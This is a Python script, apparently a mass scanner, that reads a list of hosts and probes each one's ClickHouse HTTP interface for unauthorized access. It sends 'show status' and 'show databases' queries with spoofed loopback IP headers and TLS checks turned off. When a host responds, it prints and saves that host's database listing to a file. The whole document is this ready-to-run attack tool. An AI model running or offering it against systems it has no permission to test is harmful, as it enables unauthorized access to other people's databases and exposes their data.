import requests
import time
import sys


banner="""
 ______   _ _   _ _             
|  ____| (_) \ | (_)            
| |__ ___ _|  \| |_  __ _  ___  
|  __/ _ \ | . ` | |/ _` |/ _ \ 
| | |  __/ | |\  | | (_| | (_) |
|_|  \___|_|_| \_|_|\__,_|\___/ 
                version:1.2
"""



headers = {
        "Upgrade-Insecure-Requests":"1",
        "x-forwarded-for":"127.0.0.1",
        "x-originating-ip":"127.0.0.1",
        "x-remote-ip":"127.0.0.1",
        "x-remote-addr":"127.0.0.1"
    }

def check(url):
    payload = "/?query=show%20status"
    urls = url + payload
    try:
        reps = requests.get(url=urls, headers=headers, verify=False, timeout=5)
        databases = requests.get(url=url+"/?query=show%20databases",headers=headers,verify=False,timeout=5)
        if "Code: 62" in reps.text:
            print("\033[0;32;40m[+] {} 疑似存在ClickHouseAPI-数据库接口未授权访问漏洞！！！\033[0m".format(urls))
            print(databases.text)
            f = open("reps.txt", "a+", encoding="utf-8")
            f.write(reps.url)
            f.write(databases.text)
            f.write("\n")
            f.close()
        else:
            print("\033[0;31;40m[-] {} 未发现ClickHouseAPI-数据库接口未授权访问漏洞\033[0m".format(url))
    except Exception as e:
        print("url:{}请求失败".format(url))
        

file_path = sys.argv[2]
file = open(file_path,'r',encoding='UTF-8').read().split()
print(banner)

for i in file:
    if "http" not in i:
        i = "http://" + str(i)
    check(i)
